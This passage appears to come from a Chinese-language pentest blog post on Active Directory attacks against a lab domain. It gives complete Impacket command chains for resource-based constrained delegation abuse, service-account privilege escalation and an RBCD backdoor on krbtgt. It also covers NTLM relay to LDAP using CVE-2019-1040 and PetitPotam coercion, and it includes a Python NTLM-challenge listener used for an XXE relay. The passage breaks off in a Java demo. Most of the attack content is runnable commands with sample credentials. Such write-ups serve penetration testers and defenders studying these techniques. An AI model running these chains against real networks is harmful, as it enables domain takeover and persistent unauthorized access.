+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">rbcd.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com/Alice:</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Alice123!</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.10</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">  -action</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> write</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -delegate-to</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> WIN2008-WEB</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\$</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -delegate-from</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> TEST</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\$</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308011602178.png" alt="image-20230801160224149"></p>
+<p>可以看到已经成功配置了 RBCD</p>
+<p>最后利用 S4U 协议伪造 Administrator 用户申请 ST</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">getST.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.10</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -spn</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> cifs/WIN2008-WEB.hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -impersonate</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Administrator</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com/test</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">:123456</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">export</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478"> KRB5CCNAME</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478">Administrator</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478">ccache</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">psexec.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -no-pass</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -k</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> WIN2008-WEB.hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.10</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308011603762.png" alt="image-20230801160339731"></p>
+<h2 id="服务账户提权">服务账户提权</h2>
+<p>参考文章:</p>
+<p><a href="https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw">https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw</a></p>
+<p><a href="https://www.cnblogs.com/nice0e3/p/17041293.html">https://www.cnblogs.com/nice0e3/p/17041293.html</a></p>
+<p>原理: IIS, MSSQL, Network Service 等服务账户出网时使用的是本机的机器账户, 访问域内资源时能够以机器账户的身份修改自身的委派属性, 从而提升至本地管理员权限</p>
+<p><a href="https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities">https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities</a></p>
+<p><img src="https://img.exp10it.io/img/202308011607073.jpeg" alt="图片"></p>
+<p>以 WIN2008-WEB 的 IIS 服务为例</p>
+<p><img src="https://img.exp10it.io/img/202308011614979.png" alt="image-20230801161406932"></p>
+<p>这里先执行 <code>dir \\192.168.30.40\c$</code>, 通过 Responder 可以发现 IIS 出网时使用的是本机的机器账户</p>
+<p><img src="https://img.exp10it.io/img/202308011616127.png" alt="image-20230801161606081"></p>
+<p>利用 SharpAllowedToAct</p>
+<p><a href="https://github.com/pkb1s/SharpAllowedToAct">https://github.com/pkb1s/SharpAllowedToAct</a></p>
+<p>思路跟上文差不多, 都是先利用当前用户的身份创建机器账户并配置委派属性</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">C:\inetpub\wwwroot\SharpAllowedToAct.exe</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -m</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> TEST</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -p</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 123456</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -t</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> WIN2008-WEB</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308011620878.png" alt="image-20230801162010847"></p>
+<h2 id="rbcd-后门">RBCD 后门</h2>
+<p>利用 RBCD, 设置 krbtgt 服务的委派属性为指定后门账户, 从而打造变种黄金票据</p>
+<p>首先添加机器账户</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">addcomputer.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com/Alice:</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Alice123!</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -computer-name</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> TEST</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\$</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -computer-pass</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 123456</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-host</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> DC.hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.10</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> </span></span></code></pre>
+<p>在域控上执行如下命令, 配置 krbtgt 的委派属性</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="powershell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#7FDBCAFF">Set-ADUser</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> krbtgt </span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">-</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">PrincipalsAllowedToDelegateToAccount test$</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308011623536.png" alt="image-20230801162355498"></p>
+<p>最后申请 ST</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">getST.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com/test</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">:123456</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -spn</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> krbtgt</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -impersonate</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> administrator</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.10</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">export</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478"> KRB5CCNAME</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478">administrator</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478">ccache</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">psexec.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -k</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -no-pass</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> administrator@DC.hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.10</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308011626255.png" alt="image-20230801162610215"></p>
+<p>可以连接到域内的任何一台机器</p>
+<h2 id="ntlm-relay-to-ldap">NTLM Relay to LDAP</h2>
+<p>NTLM Relay 经常会结合 RBCD 一起利用, 后者作为中继至 LDAP 的一种利用手段, 当然也还有其它的利用方式, 比如配合 Exchange 机器账户写 DCSync 权限, 利用 Shadow Credentials 等等</p>
+<p>下面简要介绍利用 SMB, HTTP, WebDAV 协议进行 NTLM Relay to LDAP 并配置 RBCD 实现本地提权/横向移动</p>
+<h3 id="smb">SMB</h3>
+<p>默认情况下, LDAP 的签名策略为协商签名 (是否签名由客户端决定), 当使用 SMB 协议发起 LDAP 请求时, 就会要求 LDAP 服务器对 NTLM 认证请求强制签名, 所以一般来说无法通过 SMB 协议进行 NTLM Relay to LDAP</p>
+<p>但是 2019 年爆出了 CVE-2019-1040 漏洞, 它能够绕过 NTLM MIC 的防护机制, 修改 NTLM 请求中的某些标志位, 使得客户端对于 SMB 发起的 LDAP 请求不要求签名, 从而实现 NTLM Relay</p>
+<p>结合强制认证 (例如 SpoolSample, PetitPotam) 配合 RBCD 可以实现横向移动</p>
+<p>首先添加机器账户</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">addcomputer.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com/Alice:</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Alice123!</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -computer-name</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> TEST</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\$</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -computer-pass</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 123456</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-host</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> DC.hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.10</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> </span></span></code></pre>
+<p>启动 ntlmrelayx, 注意设置 <code>--remove-mic</code> 选项</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">ntlmrelayx.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -t</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> ldap://192.168.30.10</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> --remove-mic</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> --delegate-access</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> --escalate-user</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">TEST$</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span></span></code></pre>
+<p>利用 PetitPotam 发起对恶意机器的 SMB 请求</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">python3</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> PetitPotam.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -d</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -u</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Alice</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -p</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Alice123!</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.40</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.20</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308011654251.png" alt="image-20230801165443199"></p>
+<p>最后申请 ST</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">getST.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com/test</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">:123456</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -spn</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> cifs/WIN7-CLIENT.hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -impersonate</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> administrator</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.10</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">export</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478"> KRB5CCNAME</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478">administrator</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478">ccache</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">psexec.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -k</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -no-pass</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> administrator@WIN7-CLIENT.hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc-ip</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.10</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308011656768.png" alt="image-20230801165606720"></p>
+<h3 id="http">HTTP</h3>
+<p>参考文章:</p>
+<p><a href="https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/">https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/</a></p>
+<p><a href="https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/">https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/</a></p>
+<p><a href="https://y4er.com/posts/xxe-to-dc-replay/">https://y4er.com/posts/xxe-to-dc-replay/</a></p>
+<p>原理是 Tomcat 5 WebDAV 的 PROPFIND 等方法在接受 XML 作为输入时存在 XXE 漏洞, 其发送请求时使用的 HttpURLConnection 类在接收到状态码为 401 的响应之后会判断 <code>WWW-Authenticate</code> 的值, 如果为 <code>NTLM</code> 则会自动使用当前用户的凭据进行认证</p>
+<p>而对于 HTTP/WebDAV 协议发起的 LDAP 请求是不要求强制签名的, 因此也可以实现 NTLM Relay</p>
+<p>简单调试一下, 本质是低版本的 JDK 对于 TrustedSites 的判断会一直返回 true, 导致对于任意网站 HttpURLConnection 都会尝试以当前用户的身份发起 NTLM 认证请求</p>
+<p>测试 JDK 8u40 以及参考文章中的 JDK 1.5, JDK 8u161 均存在此漏洞, 在 JDK 8u351 中已经修复 (针对 TrustedSites 增加了 AuthMode 字段, 默认为 <code>DISABLED</code>), 但不清楚具体是哪一个小版本修复的 (</p>
+<p>web 服务</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="python"><code><span class="line"><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">import</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> socket    </span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">s </span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> socket</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B2CCD6">socket</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">()</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">s</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B2CCD6">bind</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#212121;--shiki-dark:#82AAFF">(</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">0.0.0.0</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#212121;--shiki-dark:#82AAFF">, </span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">8000</span><span style="--shiki-light:#212121;--shiki-dark:#82AAFF">)</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> </span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">s</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B2CCD6">listen</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">5</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">raw </span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA"> b</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'''</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">HTTP/1.1 401 Unauthorized</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">WWW-Authenticate: NTLM</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'''</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B2CCD6">replace</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">b</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#F78C6C">\n</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#212121;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">b</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#22863A;--shiki-dark:#F78C6C">\r\n</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">while</span><span style="--shiki-light:#1976D2;--shiki-dark:#FF5874"> True</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">  conn</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> addr </span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> s</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B2CCD6">accept</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">()</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">  rev </span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> conn</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B2CCD6">recv</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">1024</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#C5E478">  print</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#212121;--shiki-dark:#82AAFF">rev.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B2CCD6">decode</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">())</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">  conn</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B2CCD6">send</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#212121;--shiki-dark:#82AAFF">raw</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">  conn</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B2CCD6">close</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">()</span></span></code></pre>
+<p>demo</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="java"><code><span class="line"><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">package</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> org</span><span style="--shiki-light:#212121;--shiki-dark:#C792EA">.</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">example</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">import</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> java</span><span style="--shiki-light:#212121;--shiki-dark:#C792EA">.</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">net</span><span style="--shiki-light:#212121;--shiki-dark:#C792EA">.</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">HttpURLConnection</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">import</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> java</span><span style="--shiki-light:#212121;--shiki-dark:#C792EA">.</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">net</span><span style="--shiki-light:#212121;--shiki-dark:#C792EA">.</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">URL</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
